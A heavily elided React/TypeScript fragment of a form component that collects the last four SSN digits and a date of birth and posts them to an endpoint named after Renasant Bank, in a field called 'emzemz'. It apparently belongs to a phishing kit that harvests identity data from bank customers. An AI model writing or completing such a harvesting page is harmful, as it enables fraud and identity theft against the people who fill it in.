...
const SSN1: React.FC = () => {
  ...
  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    ...
    if (!Object.values(newErrors).some((error) => error)) {
      try {
        ...
        await axios.post(`${baseUrl}api/renasant-meta-data-5/`, {
          emzemz,
  ...
  return (
    <FlowCard
      ...
      subtitle={<span className="text-slate-600">Enter the last four digits and confirm your date of birth.</span>}
      footer={footer}
    >
